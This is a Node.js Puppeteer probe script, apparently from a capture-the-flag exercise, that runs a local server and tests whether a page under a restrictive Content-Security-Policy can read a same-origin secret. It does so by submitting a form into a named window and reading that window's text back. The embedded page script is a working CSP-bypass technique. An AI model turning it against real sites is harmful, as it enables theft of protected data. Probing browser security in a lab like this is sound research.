// Probe: can a page under CSP `default-src 'none'` (scripts allowed via nonce) read a
// same-origin JSON response through a NAMED auxiliary window created by <form target>?
//
// Assertion (passes when the leak works):
//   1. fetch('/api/secret') IS blocked by default-src 'none' (control).
//   2. <form target="flagwin" action="/api/secret"> GET submit opens an auxiliary window
//      that renders the same-origin response (form-action/navigation is NOT governed by
//      default-src; only an explicit form-action directive would block it).
//   3. window.open('', 'flagwin') retrieves the EXISTING named window (returns a Window).
//   4. document.body.innerText of that window contains the secret JSON.
//
// Output: JSON line {chrome, fetchBlocked, formOpenedWindow, reopenedIsWindow, readBack, secretLeaked}
//   secretLeaked === true  -> named-window leak CONFIRMED under default-src 'none'.
//   secretLeaked === false -> leak does NOT work as described; knowledge must follow observation.
const http = require("node:http");
const puppeteer = require("puppeteer-core");

const PORT = 9981;
const SECRET = '{"flag":"pwnsec{named-window-leak-probe}"}';
const NONCE = "probe";
const CSP = `script-src 'nonce-${NONCE}'; default-src 'none'`;

const server = http.createServer((req, res) => {
  const u = new URL(req.url, "http://x");
  if (u.pathname === "/sbx") {
    res.writeHead(200, { "Content-Type": "text/html", "Content-Security-Policy": CSP });
    res.end(`<!doctype html><body><script nonce="${NONCE}">
      const out = {};
      fetch('/api/secret').then(r => out.fetchBlocked = false).catch(e => out.fetchBlocked = true);
      const f = document.createElement('form');
      f.target = 'flagwin'; f.method = 'GET'; f.action = '/api/secret';
      document.body.appendChild(f); f.submit();
      out.formOpenedWindow = true; // submit() did not throw
      setTimeout(() => {
        try {
          const w = open('', 'flagwin');
          out.reopenedIsWindow = !!(w && w.document);
          const txt = w.document && w.document.body ? w.document.body.innerText : '';
          out.readBack = txt.length > 0;
          out.secretLeaked = txt.includes('named-window-leak-probe');
          out.secretText = txt.slice(0, 80);
        } catch (e) { out.reopenError = String(e); }
        document.title = 'DONE:' + JSON.stringify(out);
      }, 1200);
    </script></body>`);
    return;
  }
  if (u.pathname === "/api/secret") {
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(SECRET);
    return;
  }
  res.writeHead(404); res.end();
});

(async () => {
  const chrome = process.env.CHROME_PATH;
  server.listen(PORT);
  const browser = await puppeteer.launch({
    executablePath: chrome,
    headless: "new",
    args: ["--no-sandbox", "--disable-dev-shm-usage"],
  });
  try {
    const pg = await browser.newPage();
    const title = await new Promise((resolve) => {
      // 兜底: goto 失败/domcontentloaded 不触发时 20s 超时，保证脚本输出 JSON 并以 exit 2 结束（不永久挂起）
      const timer = setTimeout(() => resolve("{}"), 20000);
      const settle = (v) => { clearTimeout(timer); resolve(v); };
      pg.on("domcontentloaded", async () => {
        for (let i = 0; i < 40; i++) {
          const t = await pg.title();
          if (t.startsWith("DONE:")) return settle(t.slice(5));
          await new Promise((r) => setTimeout(r, 200));
        }
        settle("{}");
      });
      pg.goto(`http://127.0.0.1:${PORT}/sbx`, { waitUntil: "domcontentloaded" }).catch(() => settle("{}"));
    });
    const result = { chrome: chrome.split("/mac_arm-")[1]?.split("/")[0] || chrome, ...JSON.parse(title) };
    console.log(JSON.stringify(result));
    if (result.secretLeaked !== true) process.exitCode = 2;
  } finally {
    await browser.close(); server.close();
  }
})();
